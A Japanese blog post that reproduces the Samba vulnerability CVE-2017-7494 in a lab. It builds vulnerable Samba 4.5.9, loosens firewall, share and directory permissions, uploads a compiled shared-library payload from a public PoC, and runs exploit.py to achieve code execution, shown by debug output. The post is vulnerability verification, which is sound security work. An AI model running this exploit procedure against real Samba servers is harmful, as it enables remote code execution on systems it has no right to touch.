<div style="text-align: center;">[f:id:motikan2010:20170531012815p:plain]</div>

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

　2017年5月24日に公開された、ファイル共有によく利用されるSambaの脆弱性「CVE-2017-7494」を実際に構築・PoCでの検証を行ってみます。  
<div style="text-align: center;">[f:id:motikan2010:20170531215510j:plain:w600]</div>  

　脆弱性の概要・対策に関しては、下記の記事が参考になります。  
[https://access.redhat.com/security/cve/cve-2017-7494:title]

[https://oss.sios.com/security/samba-security-vulnerability-20170525:embed:cite]


<!-- more -->

## 環境構築
- OS：Centos 6.9

### Sambaのインストール事前準備

```
$ yum install -y gcc
$ yum install -y python-devel
$ yum install -y gnutls-devel
$ yum install -y libacl-devel
$ yum install -y openldap-devel
```

### Samba(4.5.9)をインストール

　今回は脆弱性が存在しているバージョン(4.5.9)を利用します。  
古いバージョンですので、ソースからインストールします。
```
$ wget https://download.samba.org/pub/samba/stable/samba-4.5.9.tar.gz
$ tar zxvf samba-4.5.9.tar.gz
$ cd samba-4.5.9
$ ./configure
$ make
$ make install

# 下記のディレクトリが作成されており、インストールされていることが確認できます。
$ ls /usr/local/samba/
bin  etc  include  lib  lib64  private  sbin  share  var

# 設定ファイルを設置
$ cp examples/smb.conf.default /usr/local/samba/etc/smb.conf
```

### 外部からの通信許可

　iptableファイルを編集し、外部からSambaに対して通信の許可を行います。
```
$ vim /etc/sysconfig/iptables
下記のルールを追加
-A INPUT -m state --state NEW -m udp -p udp --dport 137 -j ACCEPT
-A INPUT -m state --state NEW -m udp -p udp --dport 138 -j ACCEPT
-A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT
-A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT

# iptables再起動
$ service iptables restart
```

### 動作確認

　設置した設定ファイルが正常に読み込まれるかを確認します。
```
$ cd /usr/local/samba/

$ bin/testparm
Load smb config files from /usr/local/samba/etc/smb.conf
rlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)
Processing section "[homes]"
Processing section "[printers]"
Loaded services file OK.
Server role: ROLE_STANDALONE

Press enter to see a dump of your service definitions

# Global parameters
[global]
	server string = Samba Server
	workgroup = MYGROUP
	log file = /usr/local/samba/var/log.%m
	max log size = 50
	server role = standalone server
	dns proxy = No
	idmap config * : backend = tdb


[homes]
	comment = Home Directories
	browseable = No
	read only = No


[printers]
	comment = All Printers
	path = /usr/spool/samba
	browseable = No
	printable = Yes
```
Samba設定が表示され、正常に読み込まれていることが確認でます。

### Sambaアカウントの作成

```
$ useradd samba -p sambpass
$ bin/smbpasswd -a samba
New SMB password:(sambpass)
Retype new SMB password:(sambpass)
Added user samba.
```

### 外部からのSambaへの接続を許可する

　初期設定では、内部からのみアクセス可能になっています。
```
;   hosts allow = 192.168.1. 192.168.2. 127.
↓ 下記のように、アクセス元のIPアドレスに修正
hosts allow = 157.XXX.XXX.XXX
```

### Sambaを起動

　下記のコマンドでSambaを起動することができます。
```
$ sbin/smbd
$ sbin/nmbd
```

### プロセスの確認

　Sambaが動作していることを確認することができます。
```
$ ps aux | grep smbd
root      4228  0.0  0.5 394700  6048 ?        Ss   23:08   0:00 sbin/smbd
root      4229  0.0  0.2 386240  2620 ?        S    23:08   0:00 sbin/smbd
root      4230  0.0  0.2 386232  2340 ?        S    23:08   0:00 sbin/smbd
root      4232  0.0  0.3 394708  3124 ?        S    23:08   0:00 sbin/smbd
root      4236  0.0  0.0 103344   900 pts/0    R+   23:08   0:00 grep smbd
$ ps aux | grep nmbd
root      4234  0.0  0.2 320588  2688 ?        Ss   23:08   0:00 sbin/nmbd
root      4238  0.0  0.0 103344   912 pts/0    S+   23:08   0:00 grep nmbd
```

### Sambaへ接続

　Sambaクライアントをインストールし、外部から接続できることを確認します。  
```
# Sambaクライアントのインストール
$ yum -y install samba-client

# Sambaクライアントで接続
$ smbclient --user=samba //163.XXX.XXX.XXX/homes
Enter samba's password:(smbpass)
Domain=[MYGROUP] OS=[Windows 6.1] Server=[Samba 4.5.9]
smb: \> ls
  .                                   D        0  Tue May 30 23:40:20 2017
  ..                                  D        0  Tue May 30 23:22:52 2017
  .bash_profile                       H      176  Thu Mar 23 09:15:00 2017
  .bashrc                             H      124  Thu Mar 23 09:15:00 2017
  .bash_logout                        H       18  Thu Mar 23 09:15:00 2017
```

　接続元のカレントディレクトリに「Sample.txt」がある場合に、ファイルのアップロード
```
smb: \> put Sample.txt
smb: \> ls Sample.txt
  Sample.txt                          A        0  Tue May 30 23:50:43 2017
```

## PoCを試してみる 
 
攻撃側のGit等のツールはインストール済みの状態から初めてみます。  
ここからはPoCを実行する「攻撃側」、Sambaが動作している「Samba側」を分けて記述していきます。  

こちらのPoCを利用します。  
[https://github.com/omri9741/cve-2017-7494:embed:cite]  

##### 攻撃側

　アップロードする共有ライブラリの準備を行っていきます。
```
$ git clone https://github.com/omri9741/cve-2017-7494.git
$ cd cve-2017-7494/
$ python --version
Python 2.7.9
$ pip install -r requirements.txt

$ cd payload
$ chmod +x build.sh
$ ./build.sh
$ ls libpoc.so
libpoc.so
$ cd ..
$ mv payload/libpoc.so .
```

　読み込ませる共有ライブラリをSambaの共有領域内に配置します。

```
$ smbclient --user=samba //163.XXX.XXX.XXX/homes
Enter samba's password:
Domain=[MYGROUP] OS=[Windows 6.1] Server=[Samba 4.5.9]

smb: \> put libpoc.so
putting file libpoc.so as \libpoc.so (1918.9 kb/s) (average 1918.9 kb/s)
```

##### Samba側

　libpoc.soが配置されていることを確認します。  
さらに、今回はPoCが実行されることを確認しやすいように、Sambaはデバッグモードで起動します。  
　これでSambaが動作中にどのようなモジュールを読み込むのかなどを確認することができます。
```
$ ls -l /home/samba/libpoc.so
-rwxr-xr-x 1 samba samba 5895  5月 31 00:10 2017 /home/samba/libpoc.so

# Sambaを停止
$ pkill smbd

# デバッグモードでSambaを起動
$ sbin/smbd -i --debuglevel=10
```

#### PoCを実行

##### 攻撃側

```
$ python2.7 exploit.py -t 163.XXX.XXX.XXX -m /home/samba/libpoc.so
```

##### Samba側(デバッグ内容)

```
Probing module '/home/samba/libpoc.so'
Error loading module '/home/samba/libpoc.so': /home/samba/libpoc.so: 共有オブジェクトファイルを開けません: 許可がありません
is_known_pipename: /home/samba/libpoc.so unknown
```
メッセージから分かるとおり、権限がなく失敗しています。  
パーミッションを少し変更してみます。  
パーミッションは「drwx --- --x」となり、パブリックフォルダだと考えれば、ありそうな感じ。
```
$ ls -l /home/
drwx------ 2 samba samba 4096  5月 31 00:24 2017 samba

$ chmod 701 /home/samba
$ ls -l /home/
drwx-----x 2 samba samba 4096  5月 31 00:24 2017 samba
```

##### 追記(2017/5/31)

　後々調べてみると、アクセスできない理由は、共有オブジェクトファイルをロードする権限が**nobody**ユーザ権限であるかららしい。  
下記はPoCのオブジェクトファイル内で「id」コマンドを実行してみた結果。
```
Probing module '/home/samba/libpoc.so'
Module '/home/samba/libpoc.so' loaded
uid=99(nobody) gid=0(root) 所属グループ=0(root),99(nobody)
```
**/home/samba**のパーミッションが700だと、当然ながらnobodyユーザではアクセスすることができない。
```
$ sudo -u nobody cat /home/samba/libpoc.so
cat: /home/samba/libpoc.so: 許可がありません
```

#### 再度PoCを実行してみます。  

libpoc.so内のコードが実行されれば成功です。

##### 攻撃側

　先ほどと同様に実行します。
```
$ python2.7 exploit.py -t 163.XXX.XXX.XXX -m /home/samba/libpoc.so
```

##### Samba側(デバッグ内容)

```
Probing module '/home/samba/libpoc.so'
Module '/home/samba/libpoc.so' loaded
hello from cve-2017-7494 poc! ;)
```
「hello from cve-2017-7494 poc! ;)」が表示され、なんとか実行することができた。

## まとめ

　今回はVPS間で検証を行ってみたが、自宅PCのSambaクライアントからVPS上のSambaに接続することができなかった。少し調べてみると下記のような記事を見つけた。  
私もこれが原因だったのだろうか。  
[http://meideru.com/archives/2052:title]  

　そうだとするとSambaは元々外部に公開するために作られたものではなさそう。  
確かにネット上で Windowsファイル共有は使ったことがなく、ローカルで使われているイメージがある。外部に公開されているのがレアだと考えると、この脆弱性でなにか問題が起こるのはなさそう。  








